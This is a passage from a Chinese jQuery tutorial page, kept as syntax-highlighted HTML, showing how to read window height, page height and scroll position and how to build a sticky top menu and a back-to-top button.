class="token punctuation">.</span><span class="token function">mouseleave</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                $box1<span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                $box1<span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                    <span class="token string">'top'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                    <span class="token string">'left'</span><span class="token punctuation">:</span> <span class="token number">0</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector">body </span><span class="token punctuation">{</span>            <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.box</span> </span><span class="token punctuation">{</span>            <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">50</span>px auto<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.box</span>,        <span class="token class">.box</span> img </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.box1</span> </span><span class="token punctuation">{</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/* color: white; */</span>            <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>            <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/robin.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>robin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是海贼王罗宾<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-获取可视区域高度"><a href="#2-获取可视区域高度" class="headerlink" title="2.获取可视区域高度"></a>2.获取可视区域高度</h3><blockquote><pre class="line-numbers language-JavaScript">$(window).height();</code></pre></blockquote><h3 id="3-获取页面高度"><a href="#3-获取页面高度" class="headerlink" title="3.获取页面高度"></a>3.获取页面高度</h3><blockquote><pre><code class="JavaScript">$(document).height();</code></pre></blockquote><h3 id="4-获取页面滚动距离"><a href="#4-获取页面滚动距离" class="headerlink" title="4.获取页面滚动距离"></a>4.获取页面滚动距离</h3><blockquote><pre><code class="JavaScript"><code class="language-JavaScript">$(window).height();</code></pre></blockquote><h3 id="3-获取页面高度"><a href="#3-获取页面高度" class="headerlink" title="3.获取页面高度"></a>3.获取页面高度</h3><blockquote><pre><code class="JavaScript">$(document).height();</code></pre></blockquote><h3 id="4-获取页面滚动距离"><a href="#4-获取页面滚动距离" class="headerlink" title="4.获取页面滚动距离"></a>4.获取页面滚动距离</h3><blockquote><pre><code class="JavaScript">$(document).scrollTop();  $(document).scrollLeft();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="5-页面滚动事件"><a href="#5-页面滚动事件" class="headerlink" title="5.页面滚动事件"></a>5.页面滚动事件</h3><blockquote><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$(window).scroll(function(){   ......  })<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-实例-置顶菜单滚动"><a href="#6-实例-置顶菜单滚动" class="headerlink" title="6.实例-置顶菜单滚动"></a>6.实例-置顶菜单滚动</h3><blockquote><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>置顶菜单滚动<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.logBar</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> wheat<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.menu</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> yellowgreen<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.down_con</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.down_con</span> p </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/* 站位 div */</span>     <span class="token selector"><span class="token class">.menu_pos</span> </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token comment" spellcheck="true">// 置顶菜单滚动</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 滚动到菜单时 position=fixed 固定住即可</span>         <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scroll</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">// 获取滚动条位置</span>             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scrollTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scrollTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                     <span class="token string">'position'</span><span class="token punctuation">:</span> <span class="token string">'fixed'</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 居中技巧,先居中,在左移</span>                     <span class="token string">'left'</span><span class="token punctuation">:</span> <span class="token string">'50%'</span><span class="token punctuation">,</span>                     <span class="token string">'margin-left'</span><span class="token punctuation">:</span> <span class="token string">'-480px'</span><span class="token punctuation">,</span>                     <span class="token string">'top'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu_pos'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                     <span class="token string">'position'</span><span class="token punctuation">:</span> <span class="token string">'static'</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 当滚动条回去时,清除 margin-left</span>                     <span class="token string">'margin-left'</span><span class="token punctuation">:</span> <span class="token string">'auto'</span><span class="token punctuation">,</span>                 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu_pos'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>logBar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Logo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>menu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>置顶菜单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 为了避免顶部菜单 一瞬间脱离文档流 设置一个站位的div --></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>menu_pos<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>down_con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="7-添加跳转顶部图标"><a href="#7-添加跳转顶部图标" class="headerlink" title="7.添加跳转顶部图标"></a>7.添加跳转顶部图标</h3><blockquote><p>这是一个固定的写法.在末尾添加一个<code>a</code> 标签.</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>置顶菜单滚动<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.logBar</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> wheat<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.menu</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> yellowgreen<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.down_con</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.down_con</span> p </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/* 站位 div */</span>     <span class="token selector"><span class="token class">.menu_pos</span> </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.totop</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">139</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">139</span>px<span class="token punctuation">;</span>         <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url">url('../images/up.png')</span> center center no-repeat white<span class="token punctuation">;</span>         <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>         <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>         <span class="token property">right</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>         <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>         <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token comment" spellcheck="true">// 置顶菜单滚动</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 滚动到菜单时 position=fixed 固定住即可</span>         <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scroll</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">// 获取滚动条位置</span>             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scrollTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scrollTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                     <span class="token string">'position'</span><span class="token punctuation">:</span> <span class="token string">'fixed'</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 居中技巧,先居中,在左移</span>                     <span class="token string">'left'</span><span class="token punctuation">:</span> <span class="token string">'50%'</span><span class="token punctuation">,</span>                     <span class="token string">'margin-left'</span><span class="token punctuation">:</span> <span class="token string">'-480px'</span><span class="token punctuation">,</span>                     <span class="token string">'top'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu_pos'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                     <span class="token string">'position'</span><span class="token punctuation">:</span> <span class="token string">'static'</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 当滚动条回去时,清除 margin-left</span>                     <span class="token string">'margin-left'</span><span class="token punctuation">:</span> <span class="token string">'auto'</span><span class="token punctuation">,</span>                 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.menu_pos'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 设置隐藏,并在一定范围后显示</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scrollTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.totop'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                 <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.totop'</span><span class="token punctuation">)</span><span class="token 